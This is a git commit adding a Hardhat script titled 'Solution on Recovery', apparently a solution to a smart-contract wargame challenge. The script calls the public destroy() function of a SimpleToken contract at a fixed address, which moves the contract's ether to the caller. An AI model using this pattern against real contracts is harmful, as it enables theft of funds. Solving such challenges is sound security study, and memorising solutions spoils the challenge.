e91471f4f7eab853bbe2d184f2e90471e2d9a486
conache <C.conache@gmail.com>
2022-07-30 18:08:35 +0300

    Solution on Recovery

---
+++ scripts/recovery.js
@@ -0,0 +1,24 @@
+const hre = require("hardhat");
+const { ethers } = hre;
+const { BigNumber } = require("ethers");
+
+async function main() {
+  const [recoverer] = await ethers.getSigners();
+
+  const SimpleToken = await ethers.getContractFactory("SimpleToken");
+  const simpleToken = await SimpleToken.attach("0xf94D4303907261a15a9802F0ee2039769974cD5F");
+
+  let balance = await ethers.provider.getBalance(simpleToken.address);
+  console.log("Token balance before:", ethers.utils.formatEther(balance.toString()));
+  await (await simpleToken.destroy(recoverer.address)).wait();
+
+  balance = await ethers.provider.getBalance(simpleToken.address);
+  console.log("Token balance after:", ethers.utils.formatEther(balance.toString()));
+}
+
+main()
+  .then(() => process.exit(0))
+  .catch((error) => {
+    console.error(error);
+    process.exit(1);
+  });
